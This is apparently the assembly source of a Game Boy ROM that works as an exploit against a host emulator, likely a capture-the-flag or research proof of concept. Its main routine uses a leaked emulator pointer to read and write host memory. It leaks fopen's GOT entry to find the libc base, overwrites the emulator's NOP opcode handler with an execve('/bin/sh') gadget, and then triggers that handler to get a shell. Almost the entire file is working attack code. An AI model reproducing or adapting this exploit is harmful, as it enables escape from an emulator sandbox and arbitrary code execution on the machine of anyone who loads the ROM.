; Memory
.define VRAM   $8000 ; video memory
.define TILES  $8000 ; tile images
.define BGMAP0 $9800 ; first 32x32 tilemap
.define BGMAP1 $9C00 ; second 32x32 tilemap
.define WRAM   $C000 ; internal memory
.define OAM    $FE00 ; sprite memory
.define HRAM   $FF80 ; fast memory for LDH

.define LEAK $d9c8

.memoryMap
    defaultSlot 0
    slot 0 $0000 size $4000
    slot 1 $C000 size $4000
.endMe

.romBankSize   $4000
.romBanks      4
.ramSize       5 ; 64 KBytes (8 banks of 8KBytes each)
.cartridgeType 2 ; MBC1+RAM
.computeChecksum
.computeComplementCheck

;;;; GB ROM header
; GB header read by bootrom
.org $100
    nop
    jp   main

; Nintendo logo required for proper boot
.byte $CE,$ED,$66,$66,$CC,$0D,$00,$0B
.byte $03,$73,$00,$83,$00,$0C,$00,$0D
.byte $00,$08,$11,$1F,$88,$89,$00,$0E
.byte $DC,$CC,$6E,$E6,$DD,$DD,$D9,$99
.byte $BB,$BB,$67,$63,$6E,$0E,$EC,$CC
.byte $DD,$DC,$99,$9F,$BB,$B9,$33,$3E

.org $143
    .byte $C0 ; CGB
    ; u are a
    .byte $61

.macro memset args dst, val, count
    ld hl, dst
    ld a, val
    ld c, count+1
    call _memset
.endm

.macro memcpy args dst, src, count
    ld de, dst
    ld hl, src
    ld c, count+1
    call _memcpy
.endm

.macro memcpy_8 args dst, src
    ld de, dst
    ld hl, src
    call _memcpy_8
.endm

.macro ptr8_add args dst, src
    ld de, dst
    ld hl, src
    call _ptr8_add
.endm

.macro sub_ptr_3 args dst, b2, b1, b0
    ld hl, dst

    ld a, (hl)
    sub a, b0
    ld (hl+), a

    ld a, (hl)
    sbc a, b1
    ld (hl+), a

    ld a, (hl)
    sbc a, b2
    ld (hl), a
.endm

.macro add_ptr_3 args dst, b2, b1, b0
    ld hl, dst

    ld a, (hl)
    add a, b0
    ld (hl+), a

    ld a, (hl)
    adc a, b1
    ld (hl+), a

    ld a, (hl)
    adc a, b2
    ld (hl+), a

    ld a, (hl)
    adc a, 0
    ld (hl+), a

    ld a, (hl)
    adc a, 0
    ld (hl+), a
.endm

.org $200
main:
    ; Spray pattern
    ld a, $41
    ld hl, $8200
    ld c, 9
-   ld (hl+), a
    dec c
    jp nz, -

    ; Backup ptr MBC1MemoryRule::m_pRAMBanks.
    memcpy_8 $8000 LEAK

    ; Subtract 0x61e10 from ptr MBC1MemoryRule::m_pRAMBanks,
    ; to map a000..c000 to buffer Processor::m_Opcodes.
    sub_ptr_3 LEAK $06 $1e $10

    ; Save Processor::OPCode0x00
    memcpy_8 $8008 LEAK
    memcpy_8 $8010 $a000

    ; Seek to call to fopen PLT entry
    sub_ptr_3 $8010 $01 $27 $d0
    memcpy_8 LEAK $8010
    ld a, ($a000) ; sanity check

    ; Leak fopen PLT entry,
    ; by parsing the operand of the "call" instruction
    memcpy $8018 $a007 4
    memset $801c $00 4
    ld a, ($a000) ; sanity check

    ; Leak fopen GOT entry
    add_ptr_3 $8018 $00 $00 $0b ; rip adjust
    ptr8_add $8018 $8010

    ; Map GOT
    memcpy_8 LEAK $8018

    ; Leak libc fopen address,
    ; Revealing the libc base
    memcpy_8 $8020 $a000

    ; Load address of ROP gadget
    ; 0xe3afe execve("/bin/sh", r15, r12)
    add_ptr_3 $8020 $06 $11 $ee

    ; Restore buffer Processor::m_Opcodes.
    memcpy_8 $d9c8 $8008
    memcpy_8 $a000 $8020

    ; Restore ptr MBC1MemoryRule::m_pRAMBanks.
    memcpy_8 $d9c8 $8000

    ; Redirect code execution
    nop           ; opcode=00

halt:
    jp halt

; memcpy_8 copies 8 bytes from source to destination.
_memcpy_8:
    ld c, $9
    jp _memcpy

; memcpy copies bytes from source to destination.
; de = destination address
; hl = source address
; c  = byte count plus one
_memcpy:
    jp +
-   ld a, (hl+)
    ld (de), a
    inc de
+   dec c
    jp nz, -
    ret

; memset fills a range in memory with a specified byte value.
; hl = destination address
; c = byte count plus one
; a = byte value
_memset:
    jr +
-   ld [hl+], a
+   dec c
    jr nz, -
ret

; de = destination address
; hl = source address
_ptr8_add:
    ; clear carry flag
    scf
    ccf
    ; add pointer
    ld c, 9
-   dec c
    ld a, (de)
    ld b, a
    ld a, (hl+)
    adc a, b
    ld (de), a
    inc de
    jp nz, -
    ret
